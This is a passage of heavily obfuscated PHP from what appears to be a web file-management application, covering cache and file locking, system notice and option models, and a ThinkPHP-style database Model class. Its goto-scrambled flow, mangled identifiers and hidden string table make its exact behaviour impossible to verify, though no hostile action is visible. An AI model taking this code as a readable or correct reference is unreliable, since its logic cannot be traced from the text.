show_json($eÂÚğ¡ŒÅ, !1); } goto b£Ù«ĞìŠ; b£Ù«ĞìŠ: if (!$fÇÒ¢ âÓ) { self::$lockItem[$C‹ŞîÑÏë÷] = !0; } return $D±Ú÷ŒïËã; goto C¢Š›­Âº¿; C¢Š›­Âº¿: } public static function lockGet($B†¶¡Öù) { $c™Ê‚¥·Éå = self::key($B†¶¡Öù); if (self::$lockItem[$c™Ê‚¥·Éå]) { return self::$lockItem[$c™Ê‚¥·Éå]; } return self::init()->lockGet($c™Ê‚¥·Éå); } public static function unlock($B„ÀÜÉ¾—) { $Eô¹ˆæ³ßœ = self::key($B„ÀÜÉ¾—); self::$lockItem[$Eô¹ˆæ³ßœ] = null; return self::init()->unlock($Eô¹ˆæ³ßœ); } public static function unlockRuntime() { $dèãí‘†²ã =& $_SERVER[Ö‘Øù]; $dºàÑ«­ª = self::init(); $Cì›×äøí‘ = !1; foreach (self::$lockItem as $A‹ğÔİŒ¼² => $dâÃÌÖ¾ÊË) { if (!$dâÃÌÖ¾ÊË) { continue; } $dºàÑ«­ª->unlock($A‹ğÔİŒ¼²); if (!$Cì›×äøí‘) { $Cì›×äøí‘ = !0; write_log($dèãí‘†²ã[855] . $A‹ğÔİŒ¼² . $dèãí‘†²ã[68] . get_caller_msg(), $dèãí‘†²ã[854]); continue; } write_log($dèãí‘†²ã[855] . $A‹ğÔİŒ¼², $dèãí‘†²ã[854]); } self::fileUnlockAll(); } public static function fileLock($a˜›ø˜ùÔ) { goto cÙçµäòóŒ; cÙçµäòóŒ: $aÓ•õº›Í =& $_SERVER[Ö‘Øù]; if (!$GLOBALS[$aÓ•õº›Í[856]]) { $GLOBALS[$aÓ•õº›Í[856]] = array(); } $GLOBALS[$aÓ•õº›Í[856]][$a˜›ø˜ùÔ] = !1; goto F¨‚¸™Ùï†; cëáŞÙÆ»¤: return !1; goto cßçéø¢•ó; F¨‚¸™Ùï†: $eÃ‘£¾ë«š = fopen(DATA_PATH . $a˜›ø˜ùÔ . $aÓ•õº›Í[857], $aÓ•õº›Í[858]); if (!$eÃ‘£¾ë«š) { return !1; } $GLOBALS[$aÓ•õº›Í[856]][$a˜›ø˜ùÔ] = $eÃ‘£¾ë«š; goto Eğ®ßÕÁœµ; Eğ®ßÕÁœµ: if (flock($eÃ‘£¾ë«š, LOCK_EX)) { return !0; } self::unlock($a˜›ø˜ùÔ); show_json($aÓ•õº›Í[859], !1); goto cëáŞÙÆ»¤; cßçéø¢•ó: } public static function fileUnlock($fˆ‘Ş¯òÓˆ) { $EŸ…ÄŠ«’ =& $_SERVER[Ö‘Øù]; $a­°Œ£ôÂª = $GLOBALS[$EŸ…ÄŠ«’[856]][$fˆ‘Ş¯òÓˆ]; if (!$a­°Œ£ôÂª) { return; } $GLOBALS[$EŸ…ÄŠ«’[856]][$fˆ‘Ş¯òÓˆ] = !1; flock($a­°Œ£ôÂª, LOCK_UN); fclose($a­°Œ£ôÂª); } public static function fileUnlockAll() { $C°ñœîöÚâ =& $_SERVER[Ö‘Øù]; if (!$GLOBALS[$C°ñœîöÚâ[856]]) { return; } foreach ($GLOBALS[$C°ñœîöÚâ[856]] as $aØö¥óæÑ— => $D¡õÒŞâ”») { if (!$D¡õÒŞâ”») { continue; } $GLOBALS[$C°ñœîöÚâ[856]][$aØö¥óæÑ—] = !1; flock($D¡õÒŞâ”», LOCK_UN); fclose($D¡õÒŞâ”»); } $GLOBALS[$C°ñœîöÚâ[856]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } goto e—•Õ‘å·ù; D÷Ôƒ–‹Ü: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\145\155\56\x6e\157\x74\151\143\x65\x4c\151\x73\x74"; public $field = array("\156\141\155\145", "\143\157\x6e\x74\145\x6e\x74", "\x61\165\x74\x68", "\x6d\x6f\x64\x65", "\x74\151\x6d\x65", "\164\171\x70\x65", "\154\145\x76\145\154", "\x65\x6e\x61\142\x6c\145", "\x73\x6f\162\164"); public function listData($CäõÌñ¦ = false, $f»·æ‡¬ = "\163\x6f\162\164", $FÓø•§´õğ = false) { return parent::listData($CäõÌñ¦, $f»·æ‡¬, $FÓø•§´õğ); } public function add($d„µ¬¶‹éŒ) { $døÁôÇÈÄ =& $_SERVER[Ö‘Øù]; $dŠÊ³·” = time(); if ($d„µ¬¶‹éŒ[$døÁôÇÈÄ[12]] == $døÁôÇÈÄ[2140]) { $dŠÊ³·” = strtotime($d„µ¬¶‹éŒ[$døÁôÇÈÄ[197]]); } $d„µ¬¶‹éŒ[$døÁôÇÈÄ[197]] = $dŠÊ³·”; return parent::insert($d„µ¬¶‹éŒ); } public function update($F«·ÔåÂí, $BÄ¸á§½ŒŸ) { goto Dêæ†àİªÓ; Dêæ†àİªÓ: $a•¢Ÿ¸„ãŠ =& $_SERVER[Ö‘Øù]; $Fğ¸ø¢Ú¼‚ = $this->listData($F«·ÔåÂí); if (!$Fğ¸ø¢Ú¼‚) { return !1; } goto Fã­Ñˆæê; e—©…ÔøÜœ: return parent::update($F«·ÔåÂí, $BÄ¸á§½ŒŸ); goto dğ×³œö½Ú; Fã­Ñˆæê: $aâµ‚óİÍ = time(); if ($BÄ¸á§½ŒŸ[$a•¢Ÿ¸„ãŠ[12]] == $a•¢Ÿ¸„ãŠ[2140]) { $aâµ‚óİÍ = strtotime($BÄ¸á§½ŒŸ[$a•¢Ÿ¸„ãŠ[197]]); } $BÄ¸á§½ŒŸ[$a•¢Ÿ¸„ãŠ[197]] = $aâµ‚óİÍ; goto e—©…ÔøÜœ; dğ×³œö½Ú: } public function remove($E‚È†ƒÁğğ) { $céØÃ²ËÏ = $this->listData($E‚È†ƒÁğğ); if (!$céØÃ²ËÏ || $céØÃ²ËÏ[$_SERVER[Ö‘Øù][1205]]) { return !1; } return parent::remove($E‚È†ƒÁğğ); } public function sort($Bñ‰ÂÚ°­¤, $FËŸ”ğªç) { return parent::update($Bñ‰ÂÚ°­¤, $FËŸ”ğªç); } public function enable($eâ‰ ×¶ó, $AÏ‰¾õ‰ÖŒ) { return parent::update($eâ‰ ×¶ó, array($_SERVER[Ö‘Øù][2141] => $AÏ‰¾õ‰ÖŒ)); } private function initUserOption() { $C¬¼ÔòÙ¿ç =& $_SERVER[Ö‘Øù]; $this->optionType = $C¬¼ÔòÙ¿ç[2142]; $this->modelType = $C¬¼ÔòÙ¿ç[2143]; $this->field = array($C¬¼ÔòÙ¿ç[2144], $C¬¼ÔòÙ¿ç[28], $C¬¼ÔòÙ¿ç[197], $C¬¼ÔòÙ¿ç[29], $C¬¼ÔòÙ¿ç[2145], $C¬¼ÔòÙ¿ç[743], $C¬¼ÔòÙ¿ç[189]); } public function userNoticeGet($D÷°Ìšßñ = false) { $this->initUserOption(); return parent::listData($D÷°Ìšßñ, $_SERVER[Ö‘Øù][395], !0); } public function userNoticeAdd($C­İÊ‘¤Æ) { $E°œÑÕµÓ® =& $_SERVER[Ö‘Øù]; $this->initUserOption(); $BîÇÛŸÆì = $this->findByKey($E°œÑÕµÓ®[2144], $C­İÊ‘¤Æ[$E°œÑÕµÓ®[395]]); if ($BîÇÛŸÆì) { return !0; } $aõÛñ¬Şò˜ = array($E°œÑÕµÓ®[2144] => $C­İÊ‘¤Æ[$E°œÑÕµÓ®[395]], $E°œÑÕµÓ®[28] => $C­İÊ‘¤Æ[$E°œÑÕµÓ®[28]], $E°œÑÕµÓ®[197] => $C­İÊ‘¤Æ[$E°œÑÕµÓ®[197]], $E°œÑÕµÓ®[29] => isset($C­İÊ‘¤Æ[$E°œÑÕµÓ®[29]]) ? $C­İÊ‘¤Æ[$E°œÑÕµÓ®[29]] : 1, $E°œÑÕµÓ®[2145] => isset($C­İÊ‘¤Æ[$E°œÑÕµÓ®[2145]]) ? $C­İÊ‘¤Æ[$E°œÑÕµÓ®[2145]] : 0, $E°œÑÕµÓ®[743] => 0, $E°œÑÕµÓ®[189] => 0); return parent::insert($aõÛñ¬Şò˜); } public function userNoticeEdit($bˆøÄ‰˜¥, $dÑïÄíÈ‘) { $this->initUserOption(); return parent::update($bˆøÄ‰˜¥, $dÑïÄíÈ‘); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\x65\155\x5f\157\x70\164\151\x6f\x6e"; protected $jsonField = array("\155\x65\x6e\165", "\162\x6f\154\x65", "\x72\157\154\x65\107\162\x6f\165\160", "\162\145\147\x69\163\x74", "\145\x6d\141\x69\154"); function __construct() { parent::__construct(); } protected function cacheKey($E’Õ¬ÉÔÙ) { return "\x53\171\x73\164\x65\155\117\160\x74\x69\157\x6e\x5f{$E’Õ¬ÉÔÙ}"; } protected function optionDefault($bŸ±Ïó‘ = '') { $d¥ôÄâ¿ö’ =& $_SERVER[Ö‘Øù]; if ($bŸ±Ïó‘ == $d¥ôÄâ¿ö’[33]) { return $GLOBALS[$d¥ôÄâ¿ö’[6]][$d¥ôÄâ¿ö’[379]]; } } } class SystemRecordModel extends ModelBaseLight { } goto aˆÀÙ¨Ö¦È; F…—Ÿ—ó: define($_SERVER[Ö‘Øù][240], 0); define($_SERVER[Ö‘Øù][241], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\144"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\164\x61\x62\154\145", "\157\162\x64\145\x72", "\141\154\x69\141\x73", "\150\x61\166\151\x6e\147", "\147\162\157\165\160", "\x6c\x6f\143\x6b", "\x64\151\163\x74\151\x6e\143\164", "\x61\x75\x74\157", "\146\151\x6c\x74\x65\162", "\166\141\154\151\x64\141\164\x65", "\x72\145\163\x75\x6c\x74", "\142\x69\156\x64", "\x74\x6f\x6b\145\156"); public function __construct($B¨•æ¶‡ÔŒ = '', $e‰‡»¶Ñ¾ = '', $aø”’¢²»µ = '') { $AØâĞÙ‰Ù =& $_SERVER[Ö‘Øù]; $this->_initialize(); if (!empty($B¨•æ¶‡ÔŒ)) { if (strpos($B¨•æ¶‡ÔŒ, $AØâĞÙ‰Ù[95])) { list($this->dbName, $this->name) = explode($AØâĞÙ‰Ù[95], $B¨•æ¶‡ÔŒ); } else { $this->name = $B¨•æ¶‡ÔŒ; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($e‰‡»¶Ñ¾)) { $this->tablePrefix = $AØâĞÙ‰Ù[33]; } elseif ($AØâĞÙ‰Ù[33] != $e‰‡»¶Ñ¾) { $this->tablePrefix = $e‰‡»¶Ñ¾; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($AØâĞÙ‰Ù[242]); } $this->db(0, empty($this->connection) ? $aø”’¢²»µ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $c¦Ÿõº¾¾ =& $_SERVER[Ö‘Øù]; if (empty($this->fields)) { if (think_config($c¦Ÿõº¾¾[243])) { $A˜ŠåäÒ = $this->dbName ? $this->dbName : think_config($c¦Ÿõº¾¾[244]); $F“–êì²ù = think_var_cache($c¦Ÿõº¾¾[245] . strtolower(get_path_this($A˜ŠåäÒ) . $c¦Ÿõº¾¾[95] . $this->name)); if ($F“–êì²ù) { $E¤µ¯ÅÜ¹¤ = think_config($c¦Ÿõº¾¾[246]); if (empty($E¤µ¯ÅÜ¹¤) || $F“–êì²ù[$c¦Ÿõº¾¾[247]] == $E¤µ¯ÅÜ¹¤) { $this->fields = $F“–êì²ù; return; } } } $this->flush(); } } public function flush() { goto bÅàÀŠŒ’İ; bÅàÀŠŒ’İ: $b‡àÌÊØ¢à =& $_SERVER[Ö‘Øù]; $this->db->setModel($this->name); $DİÌÊ›Ô† = $this->db->getFields($this->getTableName()); goto fñ¿ÉŠî¯; fñ¿ÉŠî¯: if (!$DİÌÊ›Ô†) { return !1; } $this->fields = array_keys($DİÌÊ›Ô†); $this->fields[$b‡àÌÊØ¢à[248]] = !1; goto AÒäßª×Ê‰; AÒäßª×Ê‰: foreach ($DİÌÊ›Ô† as $C„†ò¸ÉÎ˜ => $e«¾ÁÊ‡º) { $dÆ°ğ³„¸[$C„†ò¸ÉÎ˜] = $e«¾ÁÊ‡º[$b‡àÌÊØ¢à[29]]; if ($e«¾ÁÊ‡º[$b‡àÌÊØ¢à[36]]) { $this->fields[$b‡àÌÊØ¢à[249]] = $C„†ò¸ÉÎ˜; if ($e«¾ÁÊ‡º[$b‡àÌÊØ¢à[39]]) { $this->fields[$b‡àÌÊØ¢à[248]] = !0; } } } $this->fields[$b‡àÌÊØ¢à[250]] = $dÆ°ğ³„¸; if (think_config($b‡àÌÊØ¢à[246])) { $this->fields[$b‡àÌÊØ¢à[247]] = think_config($b‡àÌÊØ¢à[246]); } goto DÇÚ¡©Ÿ¢Æ; DÇÚ¡©Ÿ¢Æ: if (think_config($b‡àÌÊØ¢à[243])) { $bÌåæÚ©¶ = $this->dbName ? $this->dbName : think_config($b‡àÌÊØ¢à[244]); think_var_cache($b‡àÌÊØ¢à[245] . strtolower(get_path_this($bÌåæÚ©¶) . $b‡àÌÊØ¢à[95] . $this->name), $this->fields); } goto AÛº¢’³ƒë; AÛº¢’³ƒë: } public function switchModel($d®ìãåÉ“Ø, $b‡ùîºÏˆº = array()) { $C‘ó·¥‹¬½ =& $_SERVER[Ö‘Øù]; $c¤è†“•î = ucwords(strtolower($d®ìãåÉ“Ø)) . $C‘ó·¥‹¬½[251]; if (!class_exists($c¤è†“•î)) { think_exception($c¤è†“•î . think_lang($C‘ó·¥‹¬½[252])); } $this->_extModel = new $c¤è†“•î($this->name); if (!empty($b‡ùîºÏˆº)) { foreach ($b‡ùîºÏˆº as $Aù‹äÓ†óç) { $this->_extModel->setProperty($Aù‹äÓ†óç, $this->{$Aù‹äÓ†óç}); } } return $this->_extModel; } public function __set($eÍ˜ËÂ“Ùº, $D©¶§ôâä®) { $this->data[$eÍ˜ËÂ“Ùº] = $D©¶§ôâä®; } public function __get($E™æÒƒ“½õ) { return isset($this->data[$E™æÒƒ“½õ]) ? $this->data[$E™æÒƒ“½õ] : null; } public function __isset($Dä°¾ÃîÚ‰) { return isset($this->data[$Dä°¾ÃîÚ‰]); } public function __unset($dĞÀ‹ƒµ‘È) { unset($this->data[$dĞÀ‹ƒµ‘È]); } public function __call($a‹¹ß„¹…œ, $a¢¨½”×òê) { $aÌ—×•–‹ =& $_SERVER[Ö‘Øù]; if (in_array(strtolower($a‹¹ß„¹…œ), $this->methods, !0)) { $this->options[strtolower($a‹¹ß„¹…œ)] = $a¢¨½”×òê[0]; return $this; } elseif (in_array(strtolower($a‹¹ß„¹…œ), array($aÌ—×•–‹[253], $aÌ—×•–‹[254], $aÌ—×•–‹[255], $aÌ—×•–‹[256], $aÌ—×•–‹[257]), !0)) { $cÖÓé‘ó½· = isset($a¢¨½”×òê[0]) ? $a¢¨½”×òê[0] : $aÌ—×•–‹[182]; $cÖÓé‘ó½· = $this->db->parseKey($cÖÓé‘ó½·); return $this->getField(strtoupper($a‹¹ß„¹…œ) . $aÌ—×•–‹[258] . $cÖÓé‘ó½· . $aÌ—×•–‹[259] . $a‹¹ß„¹…œ, $aÌ—×•–‹[253]); } elseif (strtolower(substr($a‹¹ß„¹…œ, 0, 5)) == $aÌ—×•–‹[260]) { $cÖÓé‘ó½· = think_parse_name(substr($a‹¹ß„¹…œ, 5)); $F¬­ÃÜóó›[$cÖÓé‘ó½·] = $a¢¨½”×òê[0]; return $this->where($F¬­ÃÜóó›)->find(); } elseif (strtolower(substr($a‹¹ß„¹…œ, 0, 10)) == $aÌ—×•–‹[261]) { $fŠì‚ÓŒã¼ = think_parse_name(substr($a‹¹ß„¹…œ, 10)); $F¬­ÃÜóó›[$fŠì‚ÓŒã¼] = $a¢¨½”×òê[0]; return $this->where($F¬­ÃÜóó›)->getField($a¢¨½”×òê[1]); } elseif (isset($this->_scope[$a‹¹ß„¹…œ])) { return $this->scope($a‹¹ß„¹…œ, $a¢¨½”×òê[0]); } elseif (method_exists($this, $a‹¹ß„¹…œ)) { array_unshift($a¢¨½”×òê, $a‹¹ß„¹…œ); return call_user_func_array(array($this, $aÌ—×•–‹[262]), $a¢¨½”×òê); } else { return call_user_func_array(array(parent, $a‹¹ß„¹…œ), $a¢¨½”×òê); } } protected function call() { goto D¯•êÄ†Ä¤; e¬ò³¶ôŸ¯: $aÑ©¦Î÷¥³ = $EÊÇÕİõÈì; if (is_array($EÊÇÕİõÈì)) { $aÑ©¦Î÷¥³ = $EÊÇÕİõÈì[1]; $EÊÇÕİõÈì = $EÊÇÕİõÈì[0]; } $eµì˜ÀÂô = count($AƒÍ®ç÷Ô¨) - 1; goto Böâ½â·ƒ¦; Aî­‹Öæ¼: $b®‚ƒ½‚Íİ = call_user_func_array(array($this, $EÊÇÕİõÈì), $AƒÍ®ç÷Ô¨); if (method_exists($this, $DÛ¸­ˆ[266])) { $f©“å¬ = call_user_func_array(array($this, $DÛ¸­ˆ[267]), array($aÑ©¦Î÷¥³, $AƒÍ®ç÷Ô¨, $b®‚ƒ½‚Íİ)); if ($f©“å¬) { return $f©“å¬; } } return $b®‚ƒ½‚Íİ; goto c¿¨Ó‚¦õ†; D¯•êÄ†Ä¤: $DÛ¸­ˆ =& $_SERVER[Ö‘Øù]; $AƒÍ®ç÷Ô¨ = func_get_args(); $EÊÇÕİõÈì = array_shift($AƒÍ®ç÷Ô¨); goto e¬ò³¶ôŸ¯; Böâ½â·ƒ¦: if (isset($AƒÍ®ç÷Ô¨[$eµì˜ÀÂô]) && $AƒÍ®ç÷Ô¨[$eµì˜ÀÂô] === $EÊÇÕİõÈì) { think_exception(__CLASS__ . $DÛ¸­ˆ[4] . $EÊÇÕİõÈì . think_lang($DÛ¸­ˆ[263])); return; } $AƒÍ®ç÷Ô¨[] = $EÊÇÕİõÈì; if (method_exists($this, $DÛ¸­ˆ[264])) { $f©“å¬ = call_user_func_array(array($this, $DÛ¸­ˆ[265]), array($aÑ©¦Î÷¥³, $AƒÍ®ç÷Ô¨)); if (!is_null($f©“å¬) && $f©“å¬ !== !1) { return $f©“å¬; } } goto Aî­‹Öæ¼; c¿¨Ó‚¦õ†: } protected function _initialize() { } protected function _facade($Bùßø»Œ‰) { $fÑÁªØ“Ù« =& $_SERVER[Ö‘Øù]; if (!empty($this->fields)) { foreach ($Bùßø»Œ‰ as $F‹Ş§¹Â£« => $bË¨…¦È‡Û) { if (is_array($this->fields) && !in_array($F‹Ş§¹Â£«, $this->fields, !0)) { unset($Bùßø»Œ‰[$F‹Ş§¹Â£«]); } elseif (is_scalar($bË¨…¦È‡Û)) { $this->_parseType($Bùßø»Œ‰, $F‹Ş§¹Â£«); } } } if (!empty($this->options[$fÑÁªØ“Ù«[268]])) { $Bùßø»Œ‰ = array_map($this->options[$fÑÁªØ“Ù«[268]], $Bùßø»Œ‰); unset($this->options[$fÑÁªØ“Ù«[268]]); } $this->_beforeWrite($Bùßø»Œ‰); return $Bùßø»Œ‰; } protected function _beforeWrite(&$eçßĞ‹„¯‚) { } public function add($Eêˆ“óÖë¦ = '', $B«Øß¯ô„‡ = array(), $AÄ—ÆøƒĞ× = false) { goto D«—Ó‰¡í‡; fÓâ­Àƒö›: if (!1 === $this->_beforeInsert($Eêˆ“óÖë¦, $B«Øß¯ô„‡)) { return !1; } $CÇÜ–è®Œç = $this->db->insert($Eêˆ“óÖë¦, $B«Øß¯ô„‡, $AÄ—ÆøƒĞ×); if (!1 !== $CÇÜ–è®Œç) { $dï‡¹Õ÷õ— = $this->getLastInsID(); if ($dï‡¹Õ÷õ—) { $Eêˆ“óÖë¦[$this->getPk()] = $dï‡¹Õ÷õ—; $this->_after_insert($Eêˆ“óÖë¦, $B«Øß¯ô„‡); return $dï‡¹Õ÷õ—; } $this->_after_insert($Eêˆ“óÖë¦, $B«Øß¯ô„‡); } goto aæŠ”°®„; D«—Ó‰¡í‡: if (empty($Eêˆ“óÖë¦)) { if (!empty($this->data)) { $Eêˆ“óÖë¦ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[Ö‘Øù][269]); return !1; } } $B«Øß¯ô„‡ = $this->_parseOptions($B«Øß¯ô„‡); $Eêˆ“óÖë¦ = $this->_facade($Eêˆ“óÖë¦); goto fÓâ­Àƒö›; aæŠ”°®„: return $CÇÜ–è®Œç; goto b„Ä‚¯ñŒ; b„Ä‚¯ñŒ: } protected function _beforeInsert(&$a¯›í½ŒÀ, $cÚ†Ê¦ªï) { } protected function _after_insert($DçíÏÅæÌ„, $F­¨…²¹¢Œ) { } public function addAll($c®§¼»ßÍ, $dºŒîàçÛ = array(), $f‘ºÚßÎªë = false) { goto f­†Ù¥±Ğ; Aã„¾¦œë: foreach ($c®§¼»ßÍ as $dœˆã†«³Š => $aíğôÆöÓØ) { $c®§¼»ßÍ[$dœˆã†«³Š] = $this->_facade($aíğôÆöÓØ); } if (method_exists($this->db, $D¿Ùô»ô×[270])) { $fÈ°ïìô¯¾ = $this->db->insertAll($c®§¼»ßÍ, $dºŒîàçÛ, $f‘ºÚßÎªë); } else { $this->startTrans(); foreach ($c®§¼»ßÍ as $dœˆã†«³Š => $aíğôÆöÓØ) { $fÈ°ïìô¯¾ = $this->db->insert($aíğôÆöÓØ, $dºŒîàçÛ, $f‘ºÚßÎªë); } $this->commit(); } if (!1 !== $fÈ°ïìô¯¾) { $aÁ´…ê­œ = $this->getLastInsID(); if ($aÁ´…ê­œ) { return $aÁ´…ê­œ; } } goto Fæ°’ìˆ°; f­†Ù¥±Ğ: $D¿Ùô»ô× =& $_SERVER[Ö‘Øù]; if (empty($c®§¼»ßÍ)) { $this->error = think_lang($D¿Ùô»ô×[269]); return !1; } $dºŒîàçÛ = $this->_parseOptions($dºŒîàçÛ); goto Aã„¾¦œë; Fæ°’ìˆ°: return $fÈ°ïìô¯¾; goto bªÌ‡æêë; bªÌ‡æêë: } public function selectAdd($béÒéØ™Û¹ = '', $aÕ”ãŒöß = '', $aàæ˜£ê÷… = array()) { $bÙª‚Á‰Øå =& $_SERVER[Ö‘Øù]; $aàæ˜£ê÷… = $this->_parseOptions($aàæ˜£ê÷…); if (!1 === ($aÇù¶µõ“ó = $this->db->selectInsert($béÒéØ™Û¹ ? $béÒéØ™Û¹ : $aàæ˜£ê÷…[$bÙª‚Á‰Øå[271]], $aÕ”ãŒöß ? $aÕ”ãŒöß : $this->getTableName(), $aàæ˜£ê÷…))) { $this->error = think_lang($bÙª‚Á‰Øå[272]); return !1; } else { return $aÇù¶µõ“ó; } } public function save($e¯½çÓñ×£ = '', $d¡ƒ¿ÔŞÜÃ = array()) { goto Cí’»·œÌ¨; Cí’»·œÌ¨: $e†÷ å‡Û‘ =& $_SERVER[Ö‘Øù]; if (empty($e¯½çÓñ×£)) { if (!empty($this->data)) { $e¯½çÓñ×£ = $this->data; $this->data = array(); } else { $this->error = think_lang($e†÷ å‡Û‘[269]); return !1; } } $e¯½çÓñ×£ = $this->_facade($e¯½çÓñ×£); goto FÂ•‰ÚÓå¥; FÂ•‰ÚÓå¥: $d¡ƒ¿ÔŞÜÃ = $this->_parseOptions($d¡ƒ¿ÔŞÜÃ); $EœÅé¦ª³â = $this->getPk(); if (!isset($d¡ƒ¿ÔŞÜÃ[$e†÷ å‡Û‘[273]])) { if (isset($e¯½çÓñ×£[$EœÅé¦ª³â])) { $cœõ¬ª÷Ø²[$EœÅé¦ª³â] = $e¯½çÓñ×£[$EœÅé¦ª³â]; $d¡ƒ¿ÔŞÜÃ[$e†÷ å‡Û‘[273]] = $cœõ¬ª÷Ø²; unset($e¯½çÓñ×£[$EœÅé¦ª³â]); } else { $this->error = think_lang($e†÷ å‡Û‘[272]); return !1; } } goto b°¤¼˜Ï÷; b°¤¼˜Ï÷: if (is_array($d¡ƒ¿ÔŞÜÃ[$e†÷ å‡Û‘[273]]) && isset($d¡ƒ¿ÔŞÜÃ[$e†÷ å‡Û‘[273]][$EœÅé¦ª³â])) { $D‡äµâæ = $d¡ƒ¿ÔŞÜÃ[$e†÷ å‡Û‘[273]][$EœÅé¦ª³â]; } if (!1 === $this->_beforeUpdate($e¯½çÓñ×£, $d¡ƒ¿ÔŞÜÃ)) { return !1; } $eµÔãâ·Ó¥ = $this->db->update($e¯½çÓñ×£, $d¡ƒ¿ÔŞÜÃ); goto dÃİ«Ÿñ®¹; dÃİ«Ÿñ®¹: if (!1 !== $eµÔãâ·Ó¥) { if (isset($D‡äµâæ)) { $e¯½çÓñ×£[$EœÅé¦ª³â] = $D‡äµâæ; } $this->_afterUpdate($e¯½çÓñ×£, $d¡ƒ¿ÔŞÜÃ); } return $eµÔãâ·Ó¥; goto AÛ­†÷Ÿ˜; AÛ­†÷Ÿ˜: } protected function _beforeUpdate(&$AãšóÖñ‹, $bšÑ…Ü×ë×) { } protected function _afterUpdate($EŠ»öÆßé», $c ¨ïè¸) { } public function delete($Fà‘Üê…Œ = array()) { goto C¼¯²ÁƒÊá; EÜİêé›ø¬: if (is_numeric($Fà‘Üê…Œ) || is_string($Fà‘Üê…Œ)) { if (strpos($Fà‘Üê…Œ, $d¬ÆñÔ·ö¬[47])) { $C’Ã¿å†Æ‰[$c²Ùé¨ƒ´Â] = array($d¬ÆñÔ·ö¬[274], $Fà‘Üê…Œ); } else { $C’Ã¿å†Æ‰[$c²Ùé¨ƒ´Â] = $Fà‘Üê…Œ; } $this->options[$d¬ÆñÔ·ö¬[273]] = $C’Ã¿å†Æ‰; } $Fà‘Üê…Œ = $this->_parseOptions(); if (is_array($Fà‘Üê…Œ[$d¬ÆñÔ·ö¬[273]]) && isset($Fà‘Üê…Œ[$d¬ÆñÔ·ö¬[273]][$c²Ùé¨ƒ´Â])) { $a«Âµ×í›ƒ = $Fà‘Üê…Œ[$d¬ÆñÔ·ö¬[273]][$c²Ùé¨ƒ´Â]; } goto Aî»è¦¹¢º; C¼¯²ÁƒÊá: $d¬ÆñÔ·ö¬ =& $_SERVER[Ö‘Øù]; if (empty($Fà‘Üê…Œ) && empty($this->options[$d¬ÆñÔ·ö¬[273]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $c²Ùé¨ƒ´Â = $this->getPk(); goto EÜİêé›ø¬; Aî»è¦¹¢º: $BôºÕ®è = $this->db->delete($Fà‘Üê…Œ); if (!1 !== $BôºÕ®è) { $BĞ¶Èùà´ç = array(); if (isset($a«Âµ×í›ƒ)) { $BĞ¶Èùà´ç[$c²Ùé¨ƒ´Â] = $a«Âµ×í›ƒ; } $this->_after_delete($BĞ¶Èùà´ç, $Fà‘Üê…Œ); } return $BôºÕ®è; goto dÏì¥Îğîª; dÏì¥Îğîª: } protected function _after_delete($f¡¡ß¢õÉ, $fÖ±‹¿Ò½á) { } public function select($fÔ©¼§„½õ = array()) { goto eâĞÆİ¦; eâĞÆİ¦: $b™¥¿˜Å… =& $_SERVER[Ö‘Øù]; if (is_string($fÔ©¼§„½õ) || is_numeric($fÔ©¼§„½õ)) { $eÁŞÀ¾ Ÿ¼ = $this->getPk(); if (strpos($fÔ©¼§„½õ, $b™¥¿˜Å…[47])) { $F˜ÉÊ‚“ÀÄ[$eÁŞÀ¾ Ÿ¼] = array($b™¥¿˜Å…[274], $fÔ©¼§„½õ); } else { $F˜ÉÊ‚“ÀÄ[$eÁŞÀ¾ Ÿ¼] = $fÔ©¼§„½õ; } $this->options[$b™¥¿˜Å…[273]] = $F˜ÉÊ‚“ÀÄ; } elseif (!1 === $fÔ©¼§„½õ) { $fÔ©¼§„½õ = $this->_parseOptions(); return $b™¥¿˜Å…[275] . $this->db->buildSelectSql($fÔ©¼§„½õ) . $b™¥¿˜Å…[276]; } $fÔ©¼§„½õ = $this->_parseOptions(); goto eö·¯§Œè¬; eö·¯§Œè¬: $AÊÀ‘ê÷íó = $this->db->select($fÔ©¼§„½õ); if (!1 === $AÊÀ‘ê÷íó) { return !1; } if (empty($AÊÀ‘ê÷íó)) { return null; } goto cŠ¨Øœø”‡; cŠ¨Øœø”‡: $this->_afterSelect($AÊÀ‘ê÷íó, $fÔ©¼§„½õ); return $AÊÀ‘ê÷íó; goto D±«½’Ç’ù; D±«½’Ç’ù: } protected function _afterSelect(&$D­§ÇºÕ‡„, $c’öİ«×) { } public function buildSql($cƒ‚•Œù÷¸ = array()) { $fù£ÆÖùšë =& $_SERVER[Ö‘Øù]; $cƒ‚•Œù÷¸ = $this->_parseOptions($cƒ‚•Œù÷¸); return $fù£ÆÖùšë[275] . $this->db->buildSelectSql($cƒ‚•Œù÷¸) . $fù£ÆÖùšë[276]; } public function optionsValue($d±ËèŸèÄ› = null) { if (is_null($d±ËèŸèÄ›)) { return $this->options; } elseif (is_array($d±ËèŸèÄ›)) { $this->options = array_merge($this->options, $d±ËèŸèÄ›); } } protected function _parseOptions($a ×ÊÃ„õ´ = array()) { goto c°Üòãø‡¥; c¢ƒ–‹¨å: if (!isset($a ×ÊÃ„õ´[$fÚŸ”²Í˜º[277]])) { $a ×ÊÃ„õ´[$fÚŸ”²Í˜º[277]] = $this->getTableName(); $Fß•ïÚÇ¤ = $this->fields; } else { $Fß•ïÚÇ¤ = $this->getDbFields(); } if (!empty($a ×ÊÃ„õ´[$fÚŸ”²Í˜º[278]])) { $a ×ÊÃ„õ´[$fÚŸ”²Í˜º[277]] .= $fÚŸ”²Í˜º[50] . $a ×ÊÃ„õ´[$fÚŸ”²Í˜º[278]]; } $a ×ÊÃ„õ´[$fÚŸ”²Í˜º[279]] = $this->name; goto 